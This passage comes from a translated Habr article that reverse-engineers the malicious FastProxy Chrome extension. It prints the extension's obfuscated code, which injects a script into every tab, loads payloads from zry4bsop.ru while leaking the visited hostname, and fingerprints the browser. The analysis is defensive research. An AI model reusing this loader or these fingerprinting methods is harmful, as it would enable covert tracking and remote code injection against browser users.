class="hljs-function">]);</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">return</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">j</span></span></span><span class="hljs-function">},</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">f</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(h,j,k)</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">('undefined'==typeof a2690641770||!a2690641770(document.location.protocol+'//'+h)</span></span></span><span class="hljs-function">)</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(document.head)</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">var</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">document</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">createElement</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">('script')</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">setAttribute</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">('src',document.location.protocol+'//'+h)</span></span></span><span class="hljs-function">,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">setAttribute</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">('type','text/javascript')</span></span></span><span class="hljs-function">,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">document</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">head</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">appendChild</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(l)</span></span></span><span class="hljs-function">,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onload</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a982392846</span></span></span><span class="hljs-function">||</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(this.a982392846=!0,'function'==typeof j&amp;&amp;j()</span></span></span><span class="hljs-function">)},</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onerror</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a982392846</span></span></span><span class="hljs-function">||</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(this.a982392846=!0,l.parentNode.removeChild(l)</span></span></span><span class="hljs-function">,'</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">function</span></span></span><span class="hljs-function">'==</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">typeof</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">k</span></span></span><span class="hljs-function">&amp;&amp;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">k</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">)}}</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">else</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">setTimeout</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(function()</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">f</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(h,j,k)</span></span></span><span class="hljs-function">},10)},</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">g</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(h)</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(!(0&gt;=b.a3759370402||0&gt;b.a1072190280)</span></span></span><span class="hljs-function">){</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">var</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">j</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">h</span></span></span><span class="hljs-function">||</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a2302729239</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[0]</span></span></span><span class="hljs-function">,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">k</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">d</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(j)</span></span></span><span class="hljs-function">+'/'+</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">['d6s','afu','ndj','enk','6af']</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">join</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">('')</span></span></span><span class="hljs-function">+'/'+</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a3759370402</span></span></span><span class="hljs-function">+'</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">_</span></span></span><span class="hljs-function">'+</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a1072190280</span></span></span><span class="hljs-function">+'.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">js</span></span></span><span class="hljs-function">';</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">f</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(k,function()</span></span></span><span class="hljs-function">{},</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">var</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a2302729239</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">indexOf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(j)</span></span></span><span class="hljs-function">,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">m</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a2302729239</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[l+1]</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">m</span></span></span><span class="hljs-function">&amp;&amp;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">g</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(m)</span></span></span><span class="hljs-function">})}};</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a3759370402</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseInt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(b.a3759370402)</span></span></span><span class="hljs-function">||0,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a1072190280</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseInt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(b.a1072190280)</span></span></span><span class="hljs-function">||0,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">g</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">}</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">;/* </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">k</span></span></span><span class="hljs-function"> */", </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">runAt</span></span></span><span class="hljs-function">: '</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">document_end</span></span></span><span class="hljs-function">'}, </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">callback</span></span></span><span class="hljs-function">); } } } }</span></span></code> </pre> <br><p>  tabs.onUpdated starts a callback when one of the stages of loading a tab is updated to another.  <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/onUpdated">Read more here.</a> <br>  Simply put it acts on every tab. </p><br><pre> <code class="hljs lisp">if (<span class="hljs-name"><span class="hljs-name">ext_id</span></span> != 'mkelkmkgljeohnaeehnnkmdpocfmkmmf')</code> </pre> <br><p>  Except FastProxy itself.  Apparently there was a series of several extensions that worked like viruses. </p><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (tab.url.indexOf(<span class="hljs-string"><span class="hljs-string">'google'</span></span>) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) {</code> </pre> <br><p>  All urls, except for those that contain the string google.  Apparently because the tabs from Google are temporary.  The true reason is not clear to me. </p><br><p>  And the worst thing is that the script is implemented in every tab after the page is fully loaded in this tab: </p><br><h3 id="script1jshttpsgithubcomlawlietmesterfastproxy_articleblobmasterscript1js">  <a href="">script1.js</a> </h3><br><p>  We run it through JS beautifier. </p><br><h3 id="script2jshttpsgithubcomlawlietmesterfastproxy_articleblobmasterscript2js">  <a href="">script2.js</a> </h3><br><p>  Games with symbols can be omitted thanks to console.log. <br>  The most dangerous thing starts where the script tag is created. <br>  var l = document.createElement ('script'); </p><br><p>  I am primarily interested in either its innerHTML or src. </p><br><pre> <code class="hljs pgsql">l.setAttribute(<span class="hljs-string"><span class="hljs-string">'src'</span></span>, document.<span class="hljs-keyword"><span class="hljs-keyword">location</span></span>.protocol + <span class="hljs-string"><span class="hljs-string">'//'</span></span> + h)</code> </pre> <br><p>  The left part is clear - the protocol of the current page.  The right part is the actual link.  Put there console.log </p><br><p>  Get </p><br><blockquote>  zry4bsop.ru/d6safundjenk6af/30022_0.js </blockquote><br><h3 id="script3jshttpsgithubcomlawlietmesterfastproxy_articleblobmasterscript3js">  <a href="">script3.js</a> </h3><br><p>  Similarly, we run through JS beautifier </p><br><h3 id="script4jshttpsgithubcomlawlietmesterfastproxy_articleblobmasterscript4js">  <a href="">script4.js</a> </h3><br><p>  The principle of the file is the same - the most dangerous part is the addition of the script. </p><br><pre> <code class="hljs javascript"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"script"</span></span>); e.setAttribute(<span class="hljs-string"><span class="hljs-string">"src"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location.protocol + <span class="hljs-string"><span class="hljs-string">"//"</span></span> + t);</code> </pre> <br><p>  Get </p><br><blockquote>  zry4bsop.ru/d6safundjenk6af/30022_0/c_646576656c6f7065722e6d6f7a696c6c612e6f7267_0.js <br>  if you run on the website MDN </blockquote><p>  On productforums.google.com the same </p><br><blockquote>  zry4bsop.ru/d6safundjenk6af/30022_0/c_70726f64756374666f72756d732e676f6f676c652e636f6d_0.js </blockquote><p>  It turns out the right side is attached to something </p><br><p>  We look at the code </p><br><pre> <code class="hljs pgsql">document.<span class="hljs-keyword"><span class="hljs-keyword">location</span></span>.hostname ? document.<span class="hljs-keyword"><span class="hljs-keyword">location</span></span>.hostname : document.<span class="hljs-keyword"><span class="hljs-keyword">location</span></span>.toString().split("/")[<span class="hljs-number"><span class="hljs-number">2</span></span>]</code> </pre> <br><p>  mentioned in the self-calling function f <br>  then f is mentioned in </p><br><pre> <code class="hljs swift"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = o(i[t]) + <span class="hljs-string"><span class="hljs-string">"/"</span></span> + [<span class="hljs-string"><span class="hljs-string">"d6s"</span></span>, <span class="hljs-string"><span class="hljs-string">"afu"</span></span>, <span class="hljs-string"><span class="hljs-string">"ndj"</span></span>, <span class="hljs-string"><span class="hljs-string">"enk"</span></span>, <span class="hljs-string"><span class="hljs-string">"6af"</span></span>].<span class="hljs-built_in"><span class="hljs-built_in">join</span></span>('') + <span class="hljs-string"><span class="hljs-string">"/"</span></span> + a + <span class="hljs-string"><span class="hljs-string">"/c_"</span></span> + f + <span class="hljs-string"><span class="hljs-string">"_"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">c</span></span> + <span class="hljs-string"><span class="hljs-string">".js"</span></span>;</code> </pre> <br><p>  Those.  through symbolic operations, the visited URL is passed to the script. <br>  We look at the script code itself, they are the same. </p><br><h3 id="script5jshttpsgithubcomlawlietmesterfastproxy_articleblobmasterscript5js">  <a href="">script5.js</a> </h3><br><p>  Again we run through JS beautifier. </p><br><h3 id="script6jshttpsgithubcomlawlietmesterfastproxy_articleblobmasterscript6js">  <a href="">script6.js</a> </h3><br><p>  Without rewriting the code, you can look at adding nodes, creating scripts, replacing cookies, <br>  creating items from scratch, Ajax.  But it is rather difficult to understand what is actually happening. <br>  So try to rename these numbered functions. </p><br><h3 id="script7jshttpsgithubcomlawlietmesterfastproxy_articleblobmasterscript7js">  <a href="">script7.js</a> </h3><br><p>  Unraveling this file was hard.  It is most difficult to go through the constant creation of objects that create objects that create objects ... And it was also hard to find pure functions to begin to unravel the tangle. </p><br><p>  I did not manage to completely disentangle the code.  But what untangled gives the following: </p><br><p>  Build a full fingerprint of the user, which is then converted to a unique string through a series of bitwise operations. <br>  This imprint includes: </p><br><ul><li>  UserAgent </li><li>  Information about installed plugins (especially for IE).  Especially here it is worth mentioning the line about Palemoon.  The fact is that Palemoon allows you to use Java. </li><li>  Details of the processor used </li><li>  Information about installed fonts (getFontData function).  Moreover, the code provides the ability to use an extended list of fonts, in addition to the system one.  But only the system one is used. </li><li>  Unique canvas imprint (get2dCanvasFingerprint function).  Given that he uses several non-standard characters there is a check for the presence of installed languages ‚Äã‚Äãin the system. </li><li>  Unique print on webgl (getWebglFingerprint function) </li><li>  Check for fake data supplied navigator data (function hasFalseBrowser).  Especially in this regard, it is interesting to use eval.toString () to understand what kind of browser is actually used.  I would never have figured it out. </li></ul><br><p>  There is a function that runs XMLHttpRequest.  But it is not used in the code and does not start when the script is run. </p><br><p>  There is a function that introduces a flash on the page, but in fact it is not used. </p><br><p>  <strong>Check out the canvas / webgl fingerprint collection codes.</strong> </p><br><p>  There is an introduction of an iframe into the page (the appendBadIframe1 method). <br>  Now let's see what is in this iframe. </p><br><h3 id="iframe1httpsgithubcomlawlietmesterfastproxy_articleblobmasteriframe1html">  <a href="https://github.com/lawlietmester/fastproxy_article/blob/master/iframe1.html">iframe1</a> </h3><br><p>  Run through JS beautifier. </p><br><h3 id="iframe2httpsgithubcomlawlietmesterfastproxy_articleblobmasteriframe2html">  <a href="https://github.com/lawlietmester/fastproxy_article/blob/master/iframe2.html">iframe2</a> </h3><br><p>  By code, it is an information exchanger with the main script.  If the main script is for the most part bitwise operations, then the i-frame is a run through the calculated properties of the objects.  Using window.postMessage they exchange messages with each other. </p><br><h3 id="vernyomsya-k-script7jshttpsgithubcomlawlietmesterfastproxy_articleblobmasterscript7js">  Let's <a href="">go</a> back to <a href="">script7.js</a> </h3><br><p>  Execution of the file creates 6 XHR requests (and through the creation of Img), as well as a new window opens when you click on the page. <br>  Decrypted links for requests can be found in the code. </p><br><h3 id="vernyomsya-k-rasshireniyu">  Back to the extension </h3><br><p>  Returning to the expansion and links record.  These links are used as a <a href="https://developer.chrome.com/extensions/proxy">.pac</a> file for <a href="https://developer.chrome.com/extensions/proxy">the chrome.proxy.settings.set method</a> . <br>  File codes can be found here: </p><br><blockquote>  <a href="">https://github.com/lawlietmester/fastproxy_article/blob/master/pac_fastproxy.ga.js</a> <br>  <a href="">https://github.com/lawlietmester/fastproxy_article/blob/master/pac_prowebdom.ru.js</a> <br>  <a href="">https://github.com/lawlietmester/fastproxy_article/blob/master/pac_proxy-fast.ru.js</a> <br>  <a href="">https://github.com/lawlietmester/fastproxy_article/blob/master/pac_proxyrus.ru.js</a> </blockquote><p>  The general essence of the files is on blocked domains and ip hang access through a proxy, and on the other DIRECT, i.e.  access without proxy. <br>  Different set of servers and a set of blocked domains / ip. <br>  Let's look at whose servers in addition to the AutoSupport (antizapret.prostovpn.org) uses FastProxy. <br>  We drive in postls.com in search.  Open the first link. </p><br><blockquote>  VPM rule which will block the URL URL / host name <br>  browsec.com <br>  postlm.com <br>  postls.com </blockquote><p>  Those.  FastProxy uses Antizapreta and Browsec servers, not having its own servers. </p><br><hr><br><h1 id="4-pro-potencial-rasshireniya">  4. About expansion potential </h1><br><p>  With the permission of webrequest + webrequestBlocking, you can change absolutely any request, including internal requests within the chrome itself. <br>  Those.  you can completely change the HTML page, you can remove interfering headers in the requests, including the CSP (content security policy) of the site. <br>  With the help of your proxy, you can drain all user traffic that goes through your proxy. </p><br><hr><br><h1 id="5-pro-politiku-rasshireniy-google-i-mozilla">  5. About the Google and Mozilla Extensions Policy </h1><br><p>  Google‚Äôs policy is much softer than Mozilla‚Äôs, they publish almost everything. <br>  Mozilla has strict requirements: unsafe-eval is forbidden, code obfuscation is prohibited (allowed if you provide a complete collector). <br>  Also, Mozilla itself periodically looks at extension codes, but not immediately after publication. <br>  Read more <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/AMO/Policy/Reviews">here</a> and <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/Source_Code_Submission">here</a> . <br>  For this reason, installing new firefox extensions is much quieter than chromium extensions. </p><br><hr><br><h1 id="6-chto-novogo-ya-uznal-v-kode">  6. What's new, I learned in the code: </h1><br><p>  navigator gives unrealistically a lot of unique data about the browser, rather than it was in the past.  And most likely will give even more in the future. </p><br><p>  eval.toString, as well as other native functions, will allow you to calculate the current version of the browser. </p><br><p>  Unique print on canvas and webgl. </p><br><hr><br><h1 id="7-voprosy-k-chitatelyam">  7. Questions to readers </h1><br><p>  If someone worked with webgl, please tell us what the getWebglFingerprint function does.  And what's unique about it? </p><br><hr><br><p>  All sources can be found <a href="https://github.com/lawlietmester/fastproxy_article">here.</a> </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/421735/">https://habr.com/ru/post/421735/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../421725/index.html">Tale of how the AR SDK was searched on the hackathon</a></li>
<li><a href="../421727/index.html">Fujitsu boosts gallium nitride power output three times</a></li>
<li><a href="../421729/index.html">Timlid is a sergeant in the IT department</a></li>
<li><a href="../421731/index.html">How much software costs to build: what is the budget for developing an application</a></li>
<li><a href="../421733/index.html">Tackle and do: why it is sometimes useful to score for analysis and simply develop</a></li>
<li><a href="../421737/index.html">The American company has been chipping its employees for a year. Why this could be the future</a></li>
<li><a href="../421739/index.html">How did I replace RxJava with quicksies in my project and why you probably should also do it</a></li>
<li><a href="../421741/index.html">Why did a person from the Java world become an ardent supporter of Node.js and JavaScript?</a></li>
<li><a href="../421745/index.html">How Ubisoft created its Starlink hybrid gaming kit: Battle for Atlas</a></li>
<li><a href="../421747/index.html">Parktronic on Arduino</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>